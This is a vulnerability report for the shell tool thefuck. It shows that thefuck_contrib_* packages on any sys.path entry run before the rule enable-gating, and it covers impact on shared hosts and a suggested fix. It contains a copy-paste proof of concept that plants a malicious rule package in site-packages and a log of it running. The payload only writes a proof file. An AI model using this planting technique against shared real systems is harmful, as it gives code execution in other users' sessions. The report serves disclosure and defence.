# thefuck_contrib_* packages are exec'd before enable-gating on every run

**Upstream issue:** https://github.com/nvbn/thefuck/issues/1623

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04; output below is from the actual run)

## Reproduction conditions

- thefuck 3.32, Python 3.12.3, Ubuntu 24.04 (WSL2), installed in a venv
- Write access to any directory on the interpreter's `sys.path` (here: the venv's `site-packages`). On a shared host this equals a lower-privileged user account sharing that interpreter; no thefuck configuration is touched.

## Description

`corrector.get_rules_import_paths()` in `thefuck/corrector.py` scans **every `sys.path` entry** for `thefuck_contrib_*` packages:

```python
for path in sys.path:
    for contrib_module in Path(path).glob('thefuck_contrib_*'):
        contrib_rules = contrib_module.joinpath('rules')
        if contrib_rules.is_dir():
            yield contrib_rules
```

`Rule.from_path` (`thefuck/types.py:130-153`) then `load_source`s (executes) each rule module **before** any `is_enabled` / settings gating is applied. The `enabled_by_default` functions in rules only run later — the module top-level code has already executed at import time. The victim's rules enable/disable configuration cannot prevent this.

## Impact

On shared machines (shared virtualenvs, group-writable `site-packages`, or any scenario where a lower-privileged user can write into a `sys.path` entry used by another user's interpreter), a local user obtains code execution in every other user's thefuck invocation with that interpreter. The rules system's documented enable-gating does not gate imports — it only gates rule matching, after the code has already run.

On single-user machines this reduces to ordinary package-integrity trust; the finding is specifically about the shared-host case.

## PoC (copy-paste ready)

**Step 1 — plant the contrib package** (adjust `VENV` if thefuck is installed elsewhere):

```bash
VENV=/path/to/venv
SITE=$($VENV/bin/python -c "import site; print(site.getsitepackages()[0])")
mkdir -p "$SITE/thefuck_contrib_evil/rules"
echo "" > "$SITE/thefuck_contrib_evil/__init__.py"
cat > "$SITE/thefuck_contrib_evil/rules/evil.py" << 'EOF'
open("/tmp/thefuck_contrib_pwned", "w").write("code executed before enable-gating")
def match(command):
    return False  # never matches — irrelevant, import already ran
EOF
```

**Step 2 — victim runs any thefuck command** (rule loading happens at startup):

```bash
rm -f /tmp/thefuck_contrib_pwned
cd /tmp && $VENV/bin/thefuck "git statsu" >/dev/null 2>&1
```

**Step 3 — check the proof file:**

```bash
cat /tmp/thefuck_contrib_pwned   # -> "code executed before enable-gating"
```

**Step 4 — cleanup:**

```bash
rm -rf "$SITE/thefuck_contrib_evil" /tmp/thefuck_contrib_pwned
```

## Execution result (actual run: thefuck 3.32 / Python 3.12.3 / Ubuntu 24.04)

```
=== Step 0: Verify thefuck version ===
The Fuck 3.32 using Python 3.12.3 and Bash 5.2.21(1)-release

=== Step 1: Find site-packages path ===
SITE=/home/iot/PySAST-repro-all/audit-0036/venv/lib/python3.12/site-packages

=== Step 2: Plant malicious contrib package ===
Planted: .../site-packages/thefuck_contrib_evil/rules/evil.py

=== Step 4: Run thefuck with any command ===

=== Step 5: Check proof file ===
RESULT: REPRODUCED
Proof file content:
code executed before enable-gating
```

`evil.py` never matched any rule (its `match` returns `False`), and no thefuck setting enables it — yet its top-level code executed during rule loading, proving the import happens before any enable-gating.

## Suggested fix

In `corrector.py` / `types.py`: defer `load_source` until after the rule's `is_enabled` check, or restrict contrib discovery to explicitly configured paths rather than scanning all of `sys.path`.
